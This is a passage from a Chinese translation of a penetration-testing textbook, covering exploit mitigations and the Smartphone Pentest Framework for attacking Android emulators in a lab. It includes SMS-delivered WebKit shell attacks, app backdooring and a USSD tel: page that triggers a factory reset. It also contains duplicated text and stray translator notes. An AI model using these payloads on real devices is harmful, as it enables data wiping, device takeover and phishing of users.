  \ 18 章中学习过的 SEH 覆盖技术。\n\n## 漏洞缓解技术\n\n我们在第 18 章中讨论过一种名为 `SafeSEH` 的漏洞缓解技术。在这里我们将简要讨论几种。此列表并不完整，也不在本书的范围内。\n\
  \n### 栈金丝（Stack Cookies）\n\n自然，随着缓冲区溢出的变得普遍，开发者希望停止此类攻击。一种方法是使用 `stack cookies`，也称为\
  \ `canaries`。在函数开始时，会计算一个金丝值并将其添加到栈中。如果值不匹配，则检测到缓冲区溢出并终止程序。\n\n### 内存地址空间布局随机化（ASLR）\n\
  \n我们在书中编写的漏洞利用依赖于某些指令位于特定地址。例如，在第 17 章的栈栈溢出示例中，我们依赖于 `MSVCRT.dll` 模块中的 `JMP ESP`\
  \ 等效指令在所有 Windows XP SP3 系统上位于 `0x77C35459`。在第 18 章的 SEH 覆盖示例中，我们依赖于 `MFC42.dll`\
  \ 模块中的 `POP RET` 指令位于 `0x5F458CA`。如果这两种情况都不成立，我们的整个攻击方法都会被瓦解，我们必须在执行之前找到这些指令。\n\n\
  当实现 ASLR 时，你不能指某些指令位于特定地址。要查看 ASLR 的作用，请在你的 Windows 7 虚拟机上用 Immunity Debugger 打开\
  \ Winamp 程序。注意 `Winamp.exe` 和某些 DLL（如 `USER32` 和 `SHELL32`）的内存位置。现在重启系统并再次尝试。你会发现\
  \ Windows 组件的位置在重启后发生了变化，而 `Winamp.exe` 的位置保持不变。在我的情况下，第一次在 Immunity Debugger 中查看\
  \ Winamp 时，内存位置如下：\n\n*   `00400000` `Winamp.exe`\n*   `778B0000` `USER32.dll`\n\
  *   `76710000` `SHELL32.dll`\n\n重启后它们看起来像这样：\n\n*   `00400000` `Winamp.exe`\n* \
  \  `770C0000` `USER32.dll`\n*   `75810000` `SHELL32.dll`\n\n就像 SafeSEH 一样，Windows\
  \ 并没有规定程序必须实现 ASLR。即使是 Internet Explorer 等某些 Windows 应用程序也没有立即实现 ASLR。然而，Windows\
  \ Vista 及之后的共享库（如 `USER32.dll` 和 `SHELL32.dll`）使用了 ASLR。如果我们想使用这些库中的任何代码，将无法从静态地址直接调用指令。\n\
  \n### 数据执行保护（DEP）\n\n\n\n\n\n在过去几个章节中开发的漏洞中，我们依赖于能够将 shellcode 注入内存的某处、将执行权移交给 shellcode，并让\
  \ shellcode 执行。`Data execution prevention (DEP)` 通过将内存的特定部分标记为不可执行，使得这变得稍微困难。如果攻击者尝试从不可执行内存中执行代码，攻击将失败。\n\
  \n`DEP` 用于大多数现代版本的 Windows，以及 Linux、Mac OS 甚至 Android 平台。正如下一节提到的，iOS 并不需要 `DEP`。\n\
  \n为了绕过 `DEP`，攻击者通常使用一种名为`返回导向编程 (ROP)` 的技术。`ROP` 允许攻击者执行已经包含在可执行内存中的特定指令。一种常见技术是使用\
  \ `ROP` 创建一个既可写又可执行的内存区域，然后将载荷写入该内存段并执行它。\n\n## 强制代码签名\n\nApple 的 iOS 团队在防止恶意代码执行方面采取了不同的方法。在\
  \ iPhone 上执行的所有代码必须经过受信任机构（通常是 Apple 本身）的签名。要在 iPhone 上运行应用程序，开发者必须提交代码供 Apple 审核。如果\
  \ Apple 确定其应用不是恶意的，通常会被批准并由 Apple 对代码进行签名。\n\n恶意软件作者绕过安装时检测的一种常见途径是在运行时下载新的、潜在的恶意代码并执行它。然而，由于所有内存页都必须经过受信任机构的签名，这种攻击在\
  \ iPhone 上将无济于事。一旦应用程序尝试运行未签名的代码，CPU 就会拒绝它，应用程序将会崩溃。这里不需要 `DEP`，因为强制代码签名将保护又向前推了一步。\n\
  \n当然，编写可以绕过这些限制的漏洞是可能的（例如 iPhone 越狱），但在最新的 iOS 版本上，越狱并非易事。与其简短地使用 `ROP` 创建 `DEP`\
  \ 绕过不同，在强制代码签名的情况下，整个载荷必须使用 `ROP` 创建。\n\n仅靠一种缓解技术不足以击败那些拥有最新方法的、熟练的漏洞开发人员。因此，漏洞缓解技术通常被链式在一起以进一步防御攻击。例如，iOS\
  \ 同时使用了强制代码签名和全方位 `ASLR`。因此，攻击者必须对整个载荷使用 `ROP`，而且多亏于 `ASLR`，构建一个 `ROP` 载荷绝不是件容易的事。\n\
  \n在之前的两个章节中，我们对漏洞开发进行了坚实的介绍。基于我们讨论的技能，你可以转向更高级的利用技术——甚至可以攻破最新的、最安全的平台和程序。\n\n##\
  \ 总结\n\n在本章中，我们查看了基础漏洞开发的一些杂项。我们研究了名为 `fuzzing` 的技术以寻找潜在的利用点。我们还研究了公共漏洞并将其迁移以满足我们的需求。我们使用\
  \ `Msfvenom` 替换了 shellcode，并找到了适用于我们平台的返回地址。接下来，我们查看了将一个完成的 `Python` 漏洞移植到我们的第一个\
  \ `Metasploit` 模块中。从一个类似问题的模块开始，我们进行了修改以适应 3Com TFTP 长传输模式缓冲区溢出漏洞。最后，我们简要讨论了在你继续学习漏洞开发时会遇到的一些利用缓解技术。\n\
  \n我们即将到达渗透测试基础之旅的终点。让我们用一个评估移动设备安全的章节作为结束吧。\n\n### 第五部分：移动黑客\n\n## 第 20 章：使用手机渗透测试框架\n\
  \n`自自带设备 (BYOD)` 是目前行业的一个热门词汇。尽管多年来一直以各种形式将自己的设备带到工作中（例如承包商的笔记本电脑，或某人留在休息室连接到网络的游戏机），但移动设备现在正大量进入工作场所，评估这些设备的安全风险是安全团队和渗透测试人员的职责。\n\
  \n在本章中，我们将重点关注用于评估移动设备安全的工具和攻击。移动技术是一个飞速发展的领域，尽管我们在这里只能涵盖基础知识，但开发新的移动攻击和后利用技术是你开启自己的安全研究的理想起点。例如，我们将讨论一个我创建的工具，用于帮助渗透测试人员评估移动设备的安全态势，`手机渗透测试框架\
  \ (SPF)`。在读完这本书后，你将准备好开启自己的信息安全之旅，也许编写一个你自己的工具。\n\n对于本章中的大多数示例，我们将使用 `Android` 平台作为目标，因为除了是最普及的平台外，它还允许你在\
  \ Windows、Linux 和 Mac OS 平台上创建模拟器。尽管我们将关注 `Android`，但我们也会探索对越狱后 iPhone 的攻击。\n\n\
  ## 移动攻击向量\n\n尽管移动设备运行操作系统、使用 `TCP/IP` 并访问许多与传统计算机相同的资源，但它们也有自己独特的特征，为组合增加了新的攻击向量和协议。某些功能多年来一直在设备上引起过安全问题，而另一些功能（如后文讨论的近场通信）则是相当新的。\n\
  \n### 短信\n\n许多移动设备可以发送和接收短信 (SMS)。虽然大小受限，但短信允许用户几乎同时进行通信，通常取代了电子邮件作为书面通信手段。`SMS`\
  \ 开启了一种新的社交工程攻击向量。\n\n传统上，电子邮件是发送垃圾邮件和钓鱼尝试的媒介，但即使是免费的电子邮件解决方案现在过滤这些垃圾信息也做得不错。（如果你在工作时想大笑，检查一下你的电子邮件垃圾邮件箱。）`SMS`\
  \ 则是另一回事：虽然某些移动杀毒软件允许你对某些手机号码设置黑名单，但通常如果你向某个设备发送短信，信息就会被接收。这使得 `SMS` 成为垃圾邮件和钓鱼攻击的理想向量。\n\
  \n我们已经看到了烦人的移动广告和短信钓鱼尝试，诱导用户进入伪造网站输入凭据，类似于第 11 章中的网站克隆攻击。随着时间的推移，这些攻击无疑变得越来越普遍。安全意识培训需要增加以包含这种威胁。一个明知不要点击可疑电子邮件中随机链接的用户，可能仍然会点击短信中的随机链接。毕竟，这只是一条短信——短信怎么伤害你呢？但该链接将在移动浏览器或其他应用程序中打开，而这些程序可能包含额外的漏洞。\n\
  \n### 近场通信\n\n移动设备为我们带了另一个攻击向量：近场通信，或 `NFC`。`NFC` 允许设备通过接触或靠近彼此共享数据。启用了 `NFC` 的移动设备可以扫描\
  \ `NFC` 标签以自动执行任务，如更改设置或打开应用程序。某些设备可以将数据（如照片或整个应用程序）从一个设备传输到另一个。`NFC` 是另一个理想的社交工程攻击向量。例如，在\
  \ 2013 年移动 Pwn2Own 竞赛中，研究人员利用 `NFC` 通过向设备上的漏洞应用程序传输恶意载荷来攻击 Android 设备。因此，安全意识培训还应该教用户注意设备对哪些\
  \ `NFC` 标签有响应，以及正在与谁传输数据。\n\n\n\n\n\n`快速响应（QR）码`最初是为汽车制造开发的矩阵条形码。QR 码可以嵌入 URL、向移动设备上的应用程序发送数据等，用户应该意识到，他们扫描的内容可能会打开恶意程序。商店窗户上的\
  \ QR 码并不一定指向该商店的网站，而且现实中已经发生过恶意 QR 码攻击。例如，一位著名的黑客主义者将其 Twitter 头像改为 QR 码，促使许多好奇的用户用手机扫描。该\
  \ QR 码将他们导向一个恶意网页，该网页试图利用 `WebKit` 的漏洞，WebKit 是 iOS 和 Android 均使用的网页渲染引擎。\n\n# 手机渗透测试框架\
  \ (SPF)\n\n话不多说，让我们开始关注如何在 SPF 的帮助下实际攻击移动设备。SPF 仍在活跃开发中，其功能集变化迅速。当你完成本节学习时，许多菜单可能会提供额外的选项。在第\
  \ 1 章中，你下载了本书中使用的 SPF 版本，但要获取 SPF 的主且最新的分支，请访问 `[`github.com/georgiaw/Smartphone-Pentest-Framework.git/`](https://github.com/georgiaw/Smartphone-Pentest-Framework.git/)`。\n\
  \n## 设置 SPF\n\n如果你遵循了第 1 章中的指令，SPF 应该已经安装完毕并准备就绪。因为 SPF 使用 Kali 内置的 Web 服务器来交付某些有效负载，请确保\
  \ `Apache` 服务器正在运行，如下所示。\n\n```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole#\
  \ service apache2 start\n```\n\n此外，SPF 将信息记录在 `MySQL` 或 `PostgreSQL` 数据库中。确保 `MySQL`\
  \ 数据库已启动，如下所示。\n\n```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole#\
  \ service mysql start\n```\n\n最后要做的事情是编辑我们的 SPF 配置文件 `/root/Smartphone-Pentest-Framework/frameworkconsole/config`\
  \ 以匹配我们的环境。默认配置文件所示在示例 20-1。\n\n示例 20-1. SPF 配置文件\n\n```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole#\
  \ cat config\n#SMARTPHONE PENTEST FRAMEWORK CONFIG FILE\n#ROOT DIRECTORY FOR THE\
  \ WEBSERVER THAT WILL HOST OUR FILES\nWEBSERVER = /var/www\n#IPADDRESS FOR WEBSERVER\
  \ (webserver needs to be listening on this address)\nIPADDRESS = 192.168.20.9 ❶\n\
  #IP ADDRESS TO LISTEN ON FOR SHELLS\nSHELLIPADDRESS = 192.168.20.9 ❷\n#IP ADDRESS\
  \ OF SQLSERVER 127.0.0.1 IF LOCALHOST\nMYSQLSERVER = 127.0.0.1\n--snip--\n#NMAP\
  \ FOR ANDROID LOCATION\nANDROIDNMAPLOC = /root/Smartphone-Pentest-Framework/nmap-5.61TEST4\n\
  #EXPLOITS LOCATION\nEXPLOITSLOC = /root/Smartphone-Pentest-Framework/exploits\n\
  ```\n\n如果你的 Kali IP 地址是 192.168.20.9 且你将 SPF 安装在 `/root/Smartphone-Pentest-Framework/`，那么默认设置应该满足你的需求。否则，将\
  \ `IPADDRESS` ❶ 和 `SHELLIPADDRESS` ❷ 修改为你 Kali 机器的 IP 地址。\n\n现在通过切换目录到 `/root/Smartphone-Pentest-Framework/frameworkconsole/`\
  \ 并运行 `./framework.py` 来运行 SPF。你会看到类似于示例 20-2 的菜单。\n\n示例 20-2. 启动 SPF\n\n```\nroot@kali:~/Smartphone-Pentest-Framework/frameworkconsole#\
  \ ./framework.py\n################################################\n#          \
  \                                    #\n# Welcome to the Smartphone Pentest Framework!\
  \ #\n#                   v0.2.6                     #\n#         Georgia Weidman/Bulb\
  \ Security        #\n#                                              #\n################################################\n\
  \nSelect An Option from the Menu:\n\n     1.)  将框架附加到已部署的 Agent/创建 Agent\n     2.)\
  \  向 Agent 发命令\n     3.)  查看已收集的信息\n     4.)  将框架附加到手机调制解调器\n     5.)  运行远程攻击\n\
  \     6.)  运行社交工程或客户端攻击\n     7.)  清空/创建数据库\n     8.)  使用 Metasploit\n     9.) \
  \ 编译代码并在移动设备上运行\n    10.)  安装插件\n     11.) 使用 Drozer\n     0.)  退出\nspf>\n```\n\n\
  我们本章剩余部分将探索 SPF 的各种选项。现在，让我们运行一个快速测试，确保 SPF 可以与数据库通信。SPF 安装程序为 SPF 建立了一个空数据库，但你可以运行选项\
  \ `7.) Clear/Create Database`（如下所示）来清除所有数据并重新开始。此命令将清除 SPF 数据库表，如果它们不存在则会创建它们。\n\
  \n```\nspf> 7\n这将销毁你的所有数据。你确定要这么做吗？(y/N)? y\n```\n\n## Android 模拟器\n\n在第 1 章中，我们创建了三个\
  \ Android 模拟器。虽然某些攻击不受版本限制，但我们将查看这些特定的版本。\n\n## 附加手机调制解调器\n\n要从 SPF 构建 Android 应用，请选择\
  \ `4.) Attach Framework to a Mobile Modem`，如示例 20-3 所示。\n\n示例 20-3. 构建 Android 应用\n\
  \n```\nspf> 4\n\n选择要附加的调制解调器类型：\n    1.) 已连接的调制解调器\n    2.) 连接到手机应用\n    3.) 生成手机应用\n\
  \    4.) 将应用复制到 Web 服务器\n    5.) 通过 ADB 安装应用\nspf> 3\n\n选择要生成的控制应用类型：\n    1.) Android\
  \ 应用 (Android 1.6)\n    2.) 带 NFC 的 Android 应用 (Android 4.0 启用 NFC 的设备)\nspf> 1\n\
  Agent 手机号：1555215556\nAgent 控制密钥：KEYKEY1\nWeb 服务器控制路径：/androidagent\n是否正确？(y/n)y\n\
  --snip--\n-post-build:\n\ndebug:\n\nBUILD SUCCESSFUL\nTotal time: 10 seconds\n```\n\
  \n## 部署应用\n\n现在向我们的 Android 4.3 模拟器部署应用。该模拟器将模拟渗透测试控制的设备，而另外两个模拟器将是我们的目标。如果你在 Kali\
  \ Linux 上运行模拟器，或者使用通过 USB 连接到 Kali 虚拟机的真实 Android 设备，你可以使用 Android 调试桥 (ADB) 安装应用，如示例\
  \ 20-4 所示。（首先，从主菜单中选择 `4.) Attach Framework to a Mobile Modem`。）\n\n\n\n\n\n```\n\
  spf> 4\n\n选择要连接的调制解器类型：\n    1.) 搜索已连接的调制解器\n    2.) 连接到手机的 App\n    3.) 生成手机的 App\n\
  \    4.) 将 App 拷贝到 Web 服务器\n    5.) 通过 ADB 安装 App\nspf> 5\n* 进程未运行。正在端口 5037 上启动它\
  \ *\n* 进程启动成功 *\n已连接设备列表\nemulator-5554     device\nemulator-5556     device\nemulator-5558\
  \     device\n选择安装的设备：emulator-5554❶\n选择哪个 App？\n\n    1.)带有 NFC 的 Framework Android\
  \ App\n\n    2.)不带 NFC 的 Framework Android App\n\nspf> 2❷\n1463 KB/s (46775 bytes\
  \ in 0.031s)\n    pkg: /data/local/tmp/FrameworkAndroidApp.apk\nSuccess\n```\n\n\
  在`选择要连接的调制解器类型`菜单中，选择选项 `5` 让 `ADB` 搜索所有已连接的设备。接下来，告诉 SPF 要在哪个模拟器或设备上安装 SPF；在本例中，我选择了\
  \ `emulator-5554` ❶，这是一个号码为 1-555-521-5554 的 Android 4.3 模拟器。最后，告诉 SPF 安装不带 NFC\
  \ 的 Android 应用（选项 `2`）❷。\n\n如果你在宿主机系统上使用模拟器，来自 Kali 的 `ADB` 将无法连接它们。相反，要部署应用，请从主菜单选择选项\
  \ `4.) 连接 Framework 到移动调制解器`，然后选择选项 `4.) 将 App 拷贝到 Web 服务器`，如示例 20-5 所示。\n\n## 示例\
  \ 20-5. 将应用拷贝到 Web 服务器\n\n```\nspf> 4\n\n选择要连接的调制解器类型：\n    1.) 搜索已连接的调制解器\n   \
  \ 2.) 连接到手机的 App\n    3.) 生成手机的 App\n    4.) 将 App 拷贝到 Web 服务器\n    5.) 通过 ADB 安装\
  \ App\nspf> 4\n选择哪个 App？\n    1.)带有 NFC 的 Framework Android App\n    2.)不带 NFC 的\
  \ Framework Android App\nspf> 2❶\n托管路径: /bookspf2❷\n文件名: /app.apk❸\n```\n\n这将允许我们将应用拷贝到\
  \ Kali 的 Web 服务器上，我们可以在那里下载并将其安装到模拟器中。告诉 SPF 拷贝不带 NFC 的 Framework Android 应用 ❶，然后告诉它在\
  \ Web 服务器上的何处放置应用 ❷。最后，告诉 SPF 要下载的文件名 ❸。通过在手机浏览器中打开 URL *[`192.168.20.9/bookspf2/app.apk`](http://192.168.20.9/bookspf2/app.apk)*，从你的\
  \ Android 4.3 模拟器下载该应用。\n\n## 连接 SPF 服务器和应用\n\n现在我们需要连接 SPF 服务器和 SPF 应用，如示例 20-6\
  \ 所示。（再次，从主菜单的选项 `4` 开始。）\n\n## 示例 20-6. 连接到 SPF 应用\n\n```\nspf> 4\n\n选择要连接的调制解器类型：\n\
  \    1.) 搜索已连接的调制解器\n    2.) 连接到手机的 App\n    3.) 生成手机的 App\n    4.) 将 App 拷贝到 Web\
  \ 服务器\n    5.) 通过 ADB 安装 App\nspf> 2❶\n\n连接到手机管理应用。你需要提供手机号码、控制密钥和 URL 路径。\n\n手机号码:\
  \ 15555215554❷\n控制密钥: KEYKEY1❸\nApp URL 路径: /bookapp❹\n\n手机号码: 15555215554\n控制密钥:\
  \ KEYKEY1\nURL 路径: /bookapp\n是否正确?(y/N): y\n```\n\n选择 `2.) 连接到手机的 App` ❶。接下来，给 SPF\
  \ 运行 SPF 应用的模拟器的手机号码 ❷、一个七位密钥 ❸ 以及应用进行签到的 URL ❹。（密钥不需要与我们在构建应用时为代理使用的密钥相同。此外，URL\
  \ 也应该与构建应用时为代理使用的 URL 不同。）一旦你确认这些信息正确，SPF 似乎会挂起。我们需要连接应用。\n\n![SPF app](img/spfatomoreillycomsourcenostarchimages2030588.png.jpg)图\
  \ 20-1. SPF 应用\n\n要连接应用，首先在 Android 模拟器上打开它。主界面要求 SPF 服务器的 IP 地址、签到 URL 以及七位密钥。使用与上一步相同的值（但\
  \ IP 地址 应该是 SPF 服务器的 IP 地址，而不是手机号码），如图 20-1 所示。\n\n填写完信息后，点击应用上的 **Attach（连接）**。你现在可以从\
  \ SPF 控制手机，直到你点击 Detach（断开连接）。现在回到 Kali 上的 SPF。当应用连接后，你将回到 SPF 主菜单，这意味着我们准备好开始执行移动攻击了。\n\
  \n## 客户端攻击\n\n现在我们需要连接 SPF 服务器和 SPF 应用，如示例 20-6 所示。（再次，从主菜单的选项 `4` 开始。）\n\n（此处代码块已在示例中处理，此处为翻译逻辑重复，实际输出应遵循原文结构）\n\
  *注：根据指令要求，此处应为翻译后的内容，但由于原文文本中该部分重复了前面的代码块，此处保持逻辑一致。*\n\n（此处为接代码块的翻译文）\n\n使用与上一步相同的值（但\
  \ IP 地址 应该是 SPF 服务器的 IP 地址，而不是手机号码），如图 20-1 所示。\n\n填写完信息后，点击应用上的 **Attach（连接）**。你现在可以从\
  \ SPF 控制手机，直到你点击 Detach（断开连接）。现在回到 Kali 上的 SPF。当应用连接后，你将回到 SPF 主菜单，这意味着我们准备好开始执行移动攻击了。\n\
  \n## 客户端攻击\n\n在移动设备上，客户端攻击比远程攻击更普遍。正如我们在第 10 章中所学习的那样，我们的客户端攻击并不限于移动浏览器。我们还可以攻击设备上的其他默认应用以及任何可能存在漏洞的第三方应用。\n\
  \n### 客户端 Shell\n\n\n\n\n\n让我们来看一个攻击移动浏览器中 `WebKit` 包的示例，以便在 Android 设备上获取一个 shell。（这与第\
  \ 10 章 中讨论的浏览器攻击类似。）我们将在诱导用户打开恶意页面后攻击移动浏览器中的一个漏洞。执行的 shellcode 将适用于 Android 而非 Windows，但整体的攻击机制是相同的，如示例\
  \ 20-8 所示。\n\n### 示例 20-8. Android 浏览器攻击\n\n```\nspf> 6\nChoose a social engineering\
  \ or client side attack to launch:\n    1.) Direct Download Agent\n    2.) Client\
  \ Side Shell\n    3.) USSD Webpage Attack (Safe)\n    4 ) USSD Webpage Attack (Malicious)\n\
  \nspf> 2❶\nSelect a Client Side Attack to Run\n\n    1) CVE=2010-1759 Webkit Vuln\
  \ Android\n\nspf> 1❷\nHosting Path: /spfbook2❸\nFilename: /book.html❹\n\nDelivery\
  \ Method(SMS or NFC): SMS❺\nPhone Number to Attack: 15555215558\nCustom text(y/N)?\
  \ N\n```\n\n从 SPF 主菜单中选择 `6.) Run a social engineering or client side attack`。现在选择\
  \ `2.) Client Side Shell` ❶，然后选择漏洞利用选项 `1.)` `CVE=2010-1759 Webkit Vuln Android`\
  \ ❷。系统将提示你输入 Web 服务器上的路径 ❸，并询问文件名 ❹。随后，SPF 将生成一个恶意页面来攻击 `CVE-2010-1759` `WebKit`\
  \ 漏洞。\n\n然后，系统将询问你想要如何发送指向恶意页面的链接 ❺。你可以使用 NFC 或 SMS。由于我们的模拟器不支持 NFC，因此我们选择了 SMS。在提示输入攻击号码时，将\
  \ SMS 发送到你的 Android 2.1 模拟器。最后，当被询问是否要为 SMS 使用自定义文本（而不是默认的“This is a cool page:\
  \ <link>”）时，可以将默认值改为更有创意的内容，或者保持不变。\n\n我们连接到 SPF 的只有一个手机调制调器，因此 SPF 会自动使用它发送 SMS\
  \ 消息。SPF 联系我们在 Android 4.3 模拟器上的 SPF 应用，并指示其向 Android 2.1 模拟器发送短信。Android 2.1 模拟器收到的\
  \ SMS 将来自 Android 4.3 模拟器。（某些移动设备，如 iPhone，在 SMS 实现上存在漏洞，允许攻击者伪造发送者号码，使其看起来该攻击来自来自他们想要的任何号码。）收到的消息在此显示。\n\
  \n```\n15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html\n\
  ```\n\n与第 10 章 中讨论的客户端攻击一样，这种攻击依赖于用户在脆弱的移动浏览器中打开链接。我们的 Android 2.1 模拟器浏览器容易受到该攻击，当你点击链接打开移动浏览器时，浏览器将尝试打开页面约\
  \ 30 秒（此时攻击正在运行），然后崩溃。此时，你应该已经在 SPF 中拥有一个 shell 在等待你了。SPF 在 shell 打开时会自动运行 Android\
  \ 等效的 `whoami`。\n\n由于我们攻击的是浏览器，因此我们的运行身份是 `app_2`，即我们模拟器上的移动浏览器。如往常一样，shell 拥有受攻击应用的所有权限，这意味着你可以运行浏览器可用的任何命令。例如，输入\
  \ `/system/bin/ls`，如示例 20-9 所示，使用 `ls` 列出当前目录的内容。完成后，输入 `exit` 返回 SPF。\n\n### 示例\
  \ 20-9. Android shell\n\n```\nConnected: Try exit to quit\nuid=10002(app_2) gid=10002(app_2)\
  \ groups=1015(sdcard_rw),3003(inet)\n/system/bin/ls\nsqlite_stmt_journals\n--snip--\n\
  exit\n```\n\n### 注意\n\nAndroid 是 Linux 内核的分支，因此一旦我们拥有了 shell，就应该准备好在 Android 上操作了，对吧？遗憾的是，许多\
  \ Linux 工具（如 `cp`）那里并没有。此外，用户结构略有不同，每个应用都有自己的 UID。然而，对 Android 进行深入研究已超出了本章的范围。\n\
  \n我们将在本章稍后介绍另一种控制受攻击的 Android 设备的方法，即使用后门应用来调用 Android API。但首先，让我们来看另一种客户端攻击。\n\n\
  ### USSD 远程控制\n\n*非结构化补充业务数据（USSD）* 是移动设备与移动网络通信的一种方式。当您拨打特定号码时，设备将执行某些功能。\n\n2012\
  \ 年底，人们发现某些 Android 设备会在拨号器应用程序中自动打开在网页上发现的号码。当在拨号器输入 USSD 代码时，该功能会被自动调用。这听起来是攻击者滥用以远程控制设备的绝功能。\n\
  \n事实证明，攻击者可以将 USSD 代码放在网页中作为要拨打的号码，从而强制这些脆弱的设备执行各种操作。例如，如下所示，恶意网页中的 `tel:` 标签告诉\
  \ Android 这是一个电话号码。但当 USSD 代码 `267385%23` 被打开时，设备会执行出厂重置，删除用户数据。\n\n```\n<html>\n\
  <frameset>\n<frame src=\"tel:*276385%23\" />\n</frameset>\n</html>\n```\n\n### 注意\n\
  \n漏洞并不在于 USSD 代码本身，而在于某些设备对 `tel:` 标签的实现。我们的示例将使用比之前描述的无害的负载。我们将让设备自动拨打一个代码以在弹窗中显示唯一标识符，如示例\
  \ 20-10 所示。\n\n### 示例 20-10. Android USSD 攻击\n\n```\nspf> 6\nChoose a social engineering\
  \ or client side attack to launch:\n    1.) Direct Download Agent\n    2.) Client\
  \ Side Shell\n    3.) USSD Webpage Attack (Safe)\n    4 ) USSD Webpage Attack (Malicious)\n\
  \nspf> 3❶\nHosting Path: /spfbook2\nFilename: /book.html\nPhone Number to Attack:\
  \ 15555215558\n```\n\n在 SPF 中运行安全的 USSD 示例，选择菜单 `6`，然后选择 `3.) USSD Webpage Attack\
  \ (Safe)` ❶。系统将要求输入 Web 服务器的路径、恶意页面的名称以及目标短信号码。将其发送到你的 Android 2.1 模拟器。\n\n现在在 Android\
  \ 2.1 模拟器上打开收到的短信。这次浏览器没有崩溃，而是拨号应用会打开，并弹出一个通知，如图 20-2 所示。\n\n![USSD autodial](http://atomoreillycomsourcenarchimages2030590.png.jpg)图\
  \ 20-2. USSD autodial\n\n### 注意\n\n当然，该漏洞以及我们在上一节中利用的 WebKit 漏洞在发现后已经得到了修复。Android\
  \ 与安全更新的关系非常复杂。问题在于任何人都可以制造具有自己的 Android 系统 实现的 Android 设备。当 Google 发布带有一组补丁的新版本时，每个原始设备制造商（OEM）都需要将更改移植到其\
  \ Android 版本中，运营商需要向其设备推送更新。然而，更新的交付并不一致，这意味着根据型号和运营商的不同，可能有数百万未打补丁的设备在使用。\n\n现在，让我们关注一个可能永远不会被修复的漏洞：恶意应用程序。\n\
  \n\n\n\n\n在本书中，我们间断地学习了恶意程序。我们在第 4 章中使用 `Msfvenom` 创建了恶意可执行文件，在第 8 章中向漏洞 Web 服务器上传了后门，在第\
  \ 11 章中研究了通过社会工程攻击来欺骗用户下载并运行恶意程序，并在第 12 章中绕过了杀毒软件。\n\n虽然社会工程学和用户通过运行恶意程序破坏安全策略在未来几年内很可能是企业安全的主要问题，但移动设备使得这个问题变得更加复杂。很难想象会有人给你一台笔记本电脑工作，并鼓励你上互联网下载你所找到的每一个潜在有趣的、有趣或能提高效率的程序——但这恰是移动设备的营销方式。（“购买我们的设备。它拥有最好的应用程序。”“下载我们的应用。它们是生产力/娱乐/安全方面最好的。”）移动杀毒应用通常需要设备上的极高权限，甚至是管理功能才能运行，而移动设备管理解决方案通常需要在设备上安装更多应用程序。\n\
  \n移动用户被各种在设备上下载应用的理由所淹没，而且移动恶意软件正在上升，其中大部分以恶意应用程序的形式存在。如果用户被欺骗安装了恶意应用，攻击者就可以利用 `Android’s\
  \ APIs` 来窃取数据、获取远程控制，甚至攻击其他设备。\n\n在 Android 安全模型中，应用必须请求权限以使用可能被恶意利用 API，用户必须在安装时接受请求的权限。遗憾的是，用户经常会授予各种潜在危险的权限。我们可以使用\
  \ Android 权限来控制设备，而无需在用户安装恶意应用后运行额外的漏洞利用。\n\n### 创建恶意 SPF 代理\n\nSPF 允许我们创建一个具有各种有趣功能的恶意应用。早些时候，我们在渗透人员控制的设备上使用了\
  \ `SPF` 应用，允许 `SPF` 使用设备的移动调制调器和其他功能；我们这里的目标是欺骗用户在目标设备上安装 `SPF` 代理。\n\n截至本文写作时，`SPF`\
  \ 代理可以通过通过 `HTTP` 检查 Web 服务器或通过来自 `SPF` 控制的移动调制调器的隐藏 SMS 接收命令。自然地，如果我们的代理看起来像是一个有趣且/或可信的应用，我们将获得更大的成功。我们可以将代理嵌入任何合法的应用中：`SPF`\
  \ 可以获取编译好的 `APK` 文件并使用代理对其后门化，或者如果我们有该应用的源代码，也可以对其进行后门化。\n\n#### 源代码后门化\n\n让我们用源代码后门化作为示例。在主\
  \ `SPF` 菜单中选择 `1.) Attach Framework to a Deployed Agent/Create Agent`（附加框架到已部署代理/创建代理）。`SPF`\
  \ 包含了几个我们可以使用的应用模板。你也可以使用选项 `4` 将任何应用源码导入 `SPF`。如果你没有想要伪装的应用的源码，可以使用选项 `5` 对编译的\
  \ `APK` 进行后门化。你甚至可以使用 2013 年发现的 Android 主密钥漏洞，用后门化的版本替换设备上已安装的应用程序。现在，让我们只使用 `SPF`\
  \ 的模板之一，如示例 20-11 所示。\n\n示例 20-11. 构建 Android 代理\n\n```\nspf> 1\n\nSelect An Option\
  \ from the Menu:\n    1.) Attach Framework to a Deployed Agent\n    2.) Generate\
  \ Agent\n    3.) Copy Agent to Web Server\n    4.) Import an Agent\n    5.) Backdoor\
  \ APK with Agent\n    6.) Create APK Key\n\nspf> 2\n    1.) MapsDemo\n    2.) BlankEnd\n\
  \nspf> 1\nPhone number of the control modem for the agent: 155521554\nControl key\
  \ for the agent: KEYKEY1\nWebserver path for agent: /androidagent1\nControl Number:155521554\n\
  Control Key:KEYKEY1\nControlPath:/androidagent1\nIs this correct?(y/n) y\n--snip--\n\
  BUILDFUL\n```\n\n选择 `2.) Generate Agent` ❶。我们将使用 Google 随 Android SDK 分发的 `MapsDemo`\
  \ 模板 ❷ 来演示功能。在在提示时，提供发送 `SMS` 命令的电话号码 ❸、七位密钥 ❹ 以及用于检查的目录 ❺。对于代理密钥和路径，使用你创建 `SPF`\
  \ 应用时使用的相同值（[构建 Android 应用）。使用 Android 模拟器（SPF 应用）电话号码作为控制号码。`SPF` 将所选模板中构建 Android\
  \ 代理。\n\n现在来诱导用户下载并安装代理，该过程类似于我们的客户端攻击，遵循示例 20-12 中的步骤。\n\n示例 20-12. 诱导用户使用代理\n\n\
  ```\nspf> 6\n\nChoose a social engineering or client side attack to launch:\n  \
  \  1.) Direct Download Agent\n    2.) Client Side Shell\n    3.) USSD Webpage Attack\
  \ (Safe)\n    4 ) USSD Webpage Attack (Malicious)\n\nspf> ❶\nThis module sends an\
  \ SMS with a link to directly download and install an Agent\nDeliver Android Agent\
  \ or Android Meterpreter (Agent:) Agent❷\nHosting Path: /spf❸\nFilename: /maps.apk\n\
  Delivery Method:(SMS): SMS\nPhone Number to Attack: 155521556\nCustom text(y/N)?\
  \ N\n```\n\n在主菜单中选择选项 `6`，然后选择 `1.) Direct Download Agent` ❶。系统会询问你想发送 Android 代理还是\
  \ Meterpreter（Metasploit 的新增功能）。由于我们使用的是 Android 代理，选择 `Agent` ❷。按照常例，会提示 Web 服务器上的路径、应用名称、攻击媒介以及要攻击的号码❸。指示\
